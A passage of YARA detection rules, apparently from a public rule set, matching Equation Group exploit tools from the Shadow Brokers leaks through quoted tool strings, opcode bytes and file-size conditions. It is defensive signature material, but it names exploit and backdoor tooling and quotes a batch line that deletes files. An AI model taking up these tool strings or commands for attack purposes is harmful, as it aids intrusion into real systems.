vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s\" fullword ascii\n        $s3 = \",%02d%03d\" fullword ascii\n        $s4 = \"[%.2u%.2u%.2u%.2u%.2u%.2u]\" fullword ascii\n        $op1 = { 7d ec 8d 74 3f 01 0f af f7 c1 c6 05 }\n        $op2 = { 29 f1 89 fb d3 eb 89 f1 d3 e7 }\n        $op3 = { 7d e4 8d 5c 3f 01 0f af df c1 c3 05 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and 3 of them)\n}\n\nrule EquationGroup_watcher_linux_i386_v_3_3_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_watcher_linux_i386_v_3_3_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"invalid option `\" fullword ascii\n        $s8 = \"readdir64\" fullword ascii\n        $s9 = \"89:z89:%r%opw\" fullword wide\n        $s13 = \"Ropopoprstuvwypypop\" fullword wide\n        $s17 = \"Missing argument for `-x'.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 700KB and all of them)\n}\n\nrule EquationGroup_charm_saver_win2k_v_2_0_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_charm_saver_win2k_v_2_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s2 = \"0123456789abcdefABCEDF:\" fullword ascii\n        $op0 = { b8 ff ff ff ff 7f 65 eb 30 8b 55 0c 89 d7 0f b6 }\n        $op2 = { ba ff ff ff ff 83 c4 6c 89 d0 5b 5e 5f 5d c3 90 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and all of them)\n}\n\nrule EquationGroup_cursehappy_win2k_v_6_1_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_cursehappy_win2k_v_6_1_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $op1 = { e8 24 2c 01 00 85 c0 89 c6 ba ff ff ff ff 74 d6 }\n        $op2 = { 89 4c 24 04 89 34 24 89 44 24 08 e8 ce 49 ff ff }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and all of them)\n}\n\nrule EquationGroup_morerats_client_Store\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_morerats_client_Store\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[-] Failed to mmap file: %s\" fullword ascii\n        $s2 = \"[-] can not NULL terminate input data\" fullword ascii\n        $s3 = \"Missing argument for `-x'.\" fullword ascii\n        $s4 = \"[!] Value has size of 0!\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 60KB and 2 of them)\n}\n\nrule EquationGroup_watcher_linux_x86_64_v_3_3_0\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_watcher_linux_x86_64_v_3_3_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"forceprismheader\" fullword ascii\n        $s2 = \"invalid option `\" fullword ascii\n        $s3 = \"forceprism\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 900KB and all of them)\n}\n\nrule EquationGroup_linux_exactchange\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_linux_exactchange\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[+] looking for vulnerable socket\" fullword ascii\n        $x2 = \"can't use 32-bit exploit on 64-bit target\" fullword ascii\n        $x3 = \"[+] %s socket ready, exploiting...\" fullword ascii\n        $x4 = \"[!] nothing looks vulnerable, trying everything\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 2000KB and 1 of them)\n}\n\nrule EquationGroup_x86_linux_exactchange\n{\n    meta:\n        description = \"Equation Group hacktool\"\n        threat_names = \"Equation Group\"\n        ref = \"https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_x86_linux_exactchange\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"kernel has 4G/4G split, not exploitable\" fullword ascii\n        $x2 = \"[+] kernel stack size is %d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x457f and filesize < 1000KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Eclipsedwing_Rpcproxy_Pcdlllauncher\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] Failed to Prepare Payload!\" fullword ascii\n        $x2 = \"ShellcodeStartOffset\" fullword ascii\n        $x3 = \"[*] Waiting for AuthCode from exploit\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] Connection closed by remote host (TCP Ack/Fin)\" fullword ascii\n        $s2 = \"[!]Warning: Error on first request - path size may actually be larger than indicated.\" fullword ascii\n        $s4 = \"<http://%s/%s> (Not <locktoken:write1>) <http://%s/>\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 150KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Architouch_1_0_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Architouch_1_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[+] Target is %s\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 300KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Erraticgopher_1_0_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] Error appending shellcode buffer\" fullword ascii\n        $x2 = \"[-] Shellcode is too big\" fullword ascii\n        $x3 = \"[+] Exploit Payload Sent!\" fullword ascii\n        $x4 = \"[+] Bound to Dimsvc, sending exploit request to opnum 29\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 150KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Esteemaudit_2_1_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[+] Connected to target %s:%d\" fullword ascii\n        $x2 = \"[-] build_exploit_run_x64():\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Darkpulsar_1_1_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[%s] - Error upgraded DLL architecture does not match target architecture (0x%x)\" fullword ascii\n        $x2 = \"[%s] - Error building DLL loading shellcode\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[+] Shellcode Callback %s:%d\" fullword ascii\n        $x2 = \"[+] Exploiting Target\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 150KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Doublepulsar_1_3_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[+] Ping returned Target architecture: %s - XOR Key: 0x%08X\" fullword ascii\n        $x2 = \"[.] Sending shellcode to inject DLL\" fullword ascii\n        $x3 = \"[-] Error setting ShellcodeFile name\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Erraticgophertouch_1_0_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] Unable to connect to broswer named pipe, target is NOT vulnerable\" fullword ascii\n        $x2 = \"[-] Unable to bind to Dimsvc RPC syntax, target is NOT vulnerable\" fullword ascii\n        $x3 = \"[+] Bound to Dimsvc, target IS vulnerable\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 30KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Smbtouch_1_1_1\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Smbtouch_1_1_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[+] Target is vulnerable to %d exploit%s\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 400KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Educatedscholartouch_1_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[!] A vulnerable target will not respond.\" fullword ascii\n        $x2 = \"[-] Target NOT Vulernable\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 30KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Esteemaudittouch_2_1_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] Touching the target failed!\" fullword ascii\n        $x2 = \"[-] OS fingerprint not complete - 0x%08x!\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Rpctouch_2_1_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Rpctouch_2_1_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[*] Failed to detect OS / Service Pack on %s:%d\" fullword ascii\n        $x2 = \"[*] SMB String: %s (%s)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Mofconfig_1_0_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Mofconfig_1_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] Get RemoteMOFTriggerPath error\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 50KB and all of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Easypi_Explodingcan\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Easypi_Explodingcan\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] %s - Target might not be in a usable state.\" fullword ascii\n        $x2 = \"[*] Exploiting Target\" fullword ascii\n        $x3 = \"[-] Encoding Exploit Payload failed!\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Eclipsedwingtouch_1_0_4\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] The target is NOT vulnerable\" fullword ascii\n        $x2 = \"[+] The target IS VULNERABLE\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 50KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Iistouch_1_2_2\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Iistouch_1_2_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[-] Are you being redirectect? Need to retarget?\" fullword ascii\n        $x2 = \"[+] IIS Target OS: %s\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 60KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Namedpipetouch_2_0_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[*] Summary: %d pipes found\" fullword ascii\n        $s3 = \"[+] Testing %d pipes\" fullword ascii\n        $s6 = \"[-] Error on SMB startup, aborting\" fullword ascii\n        $s12 = \"92a761c29b946aa458876ff78375e0e28bc8acb0\" fullword ascii\n        $op1 = { 68 10 10 40 00 56 e8 e1 }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 40KB and 2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Easybee_1_0_1\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Easybee_1_0_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"@@for /f \\\"delims=\\\" %%i in ('findstr /smc:\\\"%s\\\" *.msg') do if not \\\"%%MsgFile1%%\\\"==\\\"%%i\\\" del /f \\\"%%i\\\"\" fullword ascii\n        $x2 = \"Logging out of WebAdmin (as target account)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Regread_1_1_1\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Regread_1_1_1\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"[+] Connected to the Registry Service\" fullword ascii\n        $s2 = \"f08d49ac41d1023d9d462d58af51414daff95a6a\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 80KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Englishmansdentist_1_2_0\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[+] CheckCredentials(): Checking to see if valid username/password\" fullword ascii\n        $x2 = \"Error connecting to target, TbMakeSocket() %s:%d.\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 200KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Architouch_Eternalsynergy_Smbtouch\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $s1 = \"NtErrorMoreProcessingRequired\" fullword ascii\n        $s2 = \"Command Format Error: Error=%x\" fullword ascii\n        $s3 = \"NtErrorPasswordRestriction\" fullword ascii\n        $op0 = { 8a 85 58 ff ff ff 88 43 4d }\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and 2 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Eternalromance_2\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17_Eternalromance_2\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"[+] Backdoor shellcode written\" fullword ascii\n        $x2 = \"[*] Attempting exploit method %d\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 600KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17__Emphasismine\n{\n    meta:\n        description = \"EquationGroup Tool - April Leak\"\n        threat_names = \"Equation Group\"\n        ref = \"https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation\"\n        vti_default_score = 5\n        vti_documents_score = 5\n        vti_scripts_score = 5\n        vti_browser_score = 5\n        vti_msi_score = 5\n        vti_static_score = 5\n        author = \"Florian Roth\"\n        source = \"https://github.com/Yara-Rules/rules\"\n        original_name = \"EquationGroup_Toolset_Apr17__Emphasismine\"\n        license = \"GPL-2.0 (https://opensource.org/licenses/GPL-2.0)\"\n\n    strings:\n        $x1 = \"Error: Could not calloc() for shellcode buffer\" fullword ascii\n        $x2 = \"shellcodeSize: 0x%04X + 0x%04X + 0x%04X = 0x%04X\" fullword ascii\n        $x3 = \"Generating shellcode\" fullword ascii\n        $x4 = \"([0-9a-zA-Z]+) OK LOGOUT completed\" fullword ascii\n        $x5 = \"Error: Domino is not the expected version. (%s, %s)\" fullword ascii\n\n    condition:\n        (uint16(0) == 0x5a4d and filesize < 100KB and 1 of them)\n}\n\nrule EquationGroup_Toolset_Apr17_Eternalromance\n{\n    meta:\n        description = \"EquationGroup 